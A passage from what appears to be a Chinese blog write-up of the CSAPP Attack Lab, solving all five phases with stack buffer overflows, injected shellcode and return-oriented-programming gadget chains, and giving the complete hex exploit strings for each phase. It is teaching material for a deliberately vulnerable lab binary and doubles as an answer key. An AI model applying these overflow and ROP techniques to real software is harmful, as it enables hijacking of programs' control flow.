    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 <code>getbuf</code> 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop</code></pre>

<p>观察上述函数 <code>getbuf</code> 的汇编代码，从第一条指令 <code>sub  $0x28,%rsp</code>，可以看到函数 <code>getbuf</code> 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。</p>
<blockquote>
<p>这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。</p>
</blockquote>
<p>最终的攻击数据如下所示：</p>
<pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
c0 17 40 00 00 00 00 00  &#x2F;&#x2F; 目标地址</code></pre>

<p>可以借助 <code>hex2raw</code> 工具将 16 进制转换为对应的字符串，再管道给 <code>ctarget</code> 即可。</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre>

<h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？</p>
<p>这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 <strong>代码注入(code injection)</strong> 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 <code>getbuf</code> 返回时，就会跳转到我们先前注入的代码，从而达成目的。</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>一种有效的注入代码完成的操作如下：</p>
<ol>
<li>写入寄存器 <code>%rdi</code> 的值，使其等于 cookie.</li>
<li>跳转到程序 <code>touch2</code> 处。</li>
</ol>
<p>关于跳转，实验手册中推荐使用 <code>ret</code> 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 <code>touch2</code>，可以先使用 <code>push</code> 将 <code>touch2</code> 的地址压入栈中，然后使用 <code>ret</code> 实现跳转。</p>
<p>对于指令的二进制表示，可以先编译： <code>gcc -c ./injec.s</code>，再反汇编：<code>objdump -d ./injec.o</code> 得到。</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi
   7:   00 
   8:   68 ec 17 40 00          pushq  $0x4017ec
   d:   c3                      retq</code></pre>

<p>另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 <strong>栈随机化（stack randomization）</strong> ，因此我们完全可以先借助 GDB 打印出调用 <code>Gets</code> 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。</p>
<p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png"></p>
<p>最终的攻击数据如下所示：</p>
<pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 00
68 ec 17 40 00 c3 00 00
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
78 dc 61 55 00 00 00 00</code></pre>

<p>最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 <code>getbuf</code> ？没了调试，在一些简单的错误上面卡半天。。。</p>
<p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png"></p>
<h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 和 phase_2 很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)
&#123;
    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;
    if (hexmatch(cookie, sval)) &#123;
    	printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
    	validate(3);
    &#125; else &#123;
    	printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
    	fail(3);
    &#125;
    exit(0);
&#125;

&#x2F;* Compare string to hex represention of unsigned value *&#x2F;
int hexmatch(unsigned val, char *sval)
&#123;
    char cbuf[110];
    &#x2F;* Make position of check string unpredictable *&#x2F;
    char *s &#x3D; cbuf + random() % 100;
    sprintf(s, &quot;%.8x&quot;, val);
    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;
&#125;</code></pre>

<p>字符串相较于整数，无外乎多了一层 <strong>indirection</strong> ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。</p>
<p>注入的代码如下：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq </code></pre>

<p>而字符串 <code>&quot;59b997fa&quot;</code> 的 ASCII 码表示为：<code>35 39 62 39 39 37 66 61 00</code>，最后的 <code>00</code> 表示 NULL，即 C 语言字符串的终结符。</p>
<p>这里我遇到了一点问题，这是错误的攻击数据：</p>
<pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68
fa 18 40 00 c3 00 00 00 
35 39 62 39 39 37 66 61
00 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
78 dc 61 55 00 00 00 00</code></pre>

<p>上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 <code>getbuf</code> 的栈帧中（<code>0x5561dc78 ~ 0x5561dc98</code>），在完成字符串正确性检验之前，字符串的值都应该 <strong>保持不变</strong> 。而实际上在函数 <code>getbuf</code> 返回后，它的栈帧空间将会被回收，留给 <code>touch3</code> 和 <code>hexmatch</code> 分配使用，且观察反汇编代码发现分配给 <code>hexmatch</code> 的栈帧空间大于 40 字节，这必然导致 <code>getbuf</code> 栈帧数据被破坏，也就导致了错误。 </p>
<p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png"></p>
<p>一种正确的方式是将字符串数据写入 <code>test</code> 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。</p>
<pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00</code></pre>

<p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png"></p>
<h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。</p>
<p>参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 <code>ret</code> 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。</p>
<p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png"></p>
<p>想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 <code>farm</code> 的反汇编代码，这部分我也是大量 <del>抄袭了</del> 参考了其他人的做法。</p>
<p>一种正确的 gadget 组合如下：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget1
00000000004019ab &lt;addval_219 + 4&gt;:
58  pop %rax
90  nop
c3  ret

# gadget2
00000000004019c5 &lt;setval_426 + 2&gt;:
48 89 c7  movq %rax,%rdi
90        nop
c3		  ret</code></pre>

<p>返回地址为 <code>0x4019ab</code>，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、<code>touch2</code> 的起始地址。 </p>
<blockquote>
<p>这里要注意出栈是从低地址向高地址方向，与入栈相反。</p>
</blockquote>
<p>最终的攻击数据如下：</p>
<pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00</code></pre>

<h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。</p>
<p>前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 <code>%rsp</code> 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。</p>
<p>以下是一种正确的 gadget 实现：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget1
00000000004019ab &lt;addval_219 + 4&gt;:
58  pop %rax
90  nop
c3  ret

# gadget2
00000000004019dd &lt;getval_481 + 2&gt;:
89 c2   movl %eax,%edx
90		nop
c3		ret

# gadget3
0000000000401a69 &lt;getval_481 + 1&gt;:
89 d1   movl %edx,%ecx
08 db	orb  %bl,%bl
c3		ret

# gadget4
0000000000401a13 &lt;addval_436 + 2&gt;:
89 ce   movl %ecx,%esi
90		nop
90		nop
c3		ret

# gadget5
0000000000401aad &lt;setval_350 + 2&gt;:
48 89 e0  movq %rsp,%rax
90		  nop
c3		  ret

# gadget6
00000000004019a2 &lt;addval_273 + 2&gt;:
48 89 c7  movq %rax,%rdi
c3		  ret

# gadget7
00000000004019d6 &lt;add_xy&gt;:
48 8d 04 37  lea  (%rdi,%rsi,1),%rax
c3			 ret

# gadget8
00000000004019a2 &lt;addval_273 + 2&gt;:
48 89 c7  movq %rax,%rdi
c3		  ret</code></pre>

<p>攻击数据的构造和 phase_4 很类似，就不过多赘述了。</p>
<pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
ad 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00</code></pre>

]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>计算机基础</tag>
        <tag>汇编语言</tag>
      </tags>
  </entry>
</search>
